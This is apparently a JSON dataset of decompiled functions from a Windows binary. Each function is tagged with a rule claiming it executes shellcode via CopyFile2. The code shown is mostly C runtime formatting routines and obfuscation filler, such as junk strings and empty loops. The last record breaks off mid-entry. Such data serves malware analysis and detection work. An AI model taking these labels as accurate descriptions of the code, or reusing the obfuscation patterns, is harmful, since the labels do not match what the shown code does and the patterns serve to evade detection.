{
    "0040100f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040100f(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404c50(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.004059cf();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1080
    },
    "0040101e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040101e(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105a(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 470
    },
    "0040124e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040124e(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 397
    },
    "004012d0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "004014ba": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004014ba(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00405047();\n    if (cVar2 == '\\0') {\ncode_r0x004a3293:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.00406622();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar6 = 0,  *(param_1 + 0x31) == 'G')))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404c50(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.004059cf();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.00401541(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a3293;\n            uVar4 = fcn.004059cf();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x31);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            arg_14h = fcn.0040312f();\n            arg_10h = fcn.004059cf();\n            fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.004022f2(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405bf5(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x31) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1158
    },
    "00401546": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401546(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4509a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"zjoxtjkboggjgqfwvcf\");\n    uStack24 = 4;\n    fcn.00401e79(\"magtybwwcxvvwntvfwbmyhajgupcqdtpieqdxviffntxqxgvwfkmtuolrhmgjhecjrjghyb\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 259
    },
    "0040157d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040157d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a6325;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a6325;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a6325:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004058a3(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.004069a6(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00402270(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1117
    },
    "00401677": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401677(uint arg_8h, uint arg_ch)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack144;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x4507c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"mqystl\");\n    uStack24 = 0;\n    fcn.00401e79(\"ioviihbtcuqzpfqykskypuigkriqwavwkgvywbpwbsuclqhlpkqrikvjyvnu\");\n    uStack24 = 1;\n    fcn.00401e79(\"brbgaeewdnyhnbqtdtxgamksg\");\n    for (iStack144 = 0x33; 0 < iStack144; iStack144 = iStack144 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"jrfdmqypb\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 323
    },
    "004018a7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018a7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 455
    },
    "00401b13": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b13(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_ch._2_2_ & 0x7ff0) == 0x7ff0) {\n        iVar1 = fcn.00405268(arg_8h, CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h)) >> 0x20);\n        if (iVar1 == 1) {\n            return 0x200;\n        }\n        if (iVar1 == 2) {\n            iVar1 = 4;\n        }\n        else {\n            if (iVar1 != 3) {\n                return 1;\n            }\n            iVar1 = 2;\n        }\n        return iVar1;\n    }\n    if (((arg_ch & 0x7ff00000) == 0) && (((arg_ch & 0xfffff) != 0 || (arg_8h != 0)))) {\n        return (-((arg_ch & 0x80000000) != 0) & 0xffffff90) + 0x80;\n    }\n    if (CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h)) == 0.0) {\n        return (-((arg_ch & 0x80000000) != 0) & 0xffffffe0) + 0x40;\n    }\n    return (-((arg_ch & 0x80000000) != 0) & 0xffffff08) + 0x100;\n}\n",
        "token_count": 345
    },
    "00401bd1": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401bd1(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack180;\n    uchar auStack176 [24];\n    uchar auStack152 [24];\n    int32_t iStack128;\n    int32_t iStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    ulong uStack112;\n    uint uStack104;\n    uint uStack100;\n    uchar uStack69;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff28;\n    uStack28 = 0x450ce0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x121c;\n    uStack52 = 0x40b09600;\n    uStack56 = 0;\n    uStack60 = 0x40b1ca00;\n    uStack64 = 0;\n    uStack68 = 0x727;\n    uStack69 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"hgfwxjcuiurv\");\n    uStack100 = 0x90c;\n    uStack104 = 0x2eb;\n    uStack112 = *0x547018;\n    for (iStack116 = 0x1b; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    for (iStack120 = 0xe; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    for (iStack124 = 9; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    for (iStack128 = 0x25; 0 < iStack128; iStack128 = iStack128 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"hgfwxjcuiurv\");\n    uStack24 = 3;\n    fcn.00401e79(\"hgfwxjcuiurv\");\n    uVar1 = fcn.00405b37(auStack176, auStack152);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack180 = 0x44; 0 < iStack180; iStack180 = iStack180 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 722
    },
    "00401e33": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401e33(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a58b6;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a58b6;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a58b6:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404c50(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.00405092(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.0040683e(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1117
    },
    "00401e7e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401e7e(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404c50(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.004059cf();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1163
    },
    "00401f73": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
